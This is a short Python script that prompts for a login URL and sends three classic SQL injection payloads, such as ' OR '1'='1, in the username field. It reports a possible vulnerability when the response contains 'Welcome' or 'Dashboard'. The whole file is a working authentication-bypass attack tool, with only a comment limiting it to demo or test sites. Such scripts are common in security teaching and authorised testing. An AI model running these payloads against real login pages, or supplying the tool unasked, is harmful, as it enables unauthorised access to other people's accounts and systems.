import requests

# Target login URL (demo/test site only)
url = input("Enter login URL: ")

# SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a"
]

# Dummy login data
data = {
    "username": "admin",
    "password": "password"
}

print("\nStarting SQL Injection Test...\n")

for payload in payloads:
    data["username"] = payload
    
    try:
        response = requests.post(url, data=data)
        
        if "Welcome" in response.text or "Dashboard" in response.text:
            print(f"[!] Possible SQL Injection vulnerability with payload: {payload}")
        else:
            print(f"[+] Tested payload: {payload} - Not vulnerable")
    
    except:
        print("Error connecting to website")

print("\nTesting Completed!")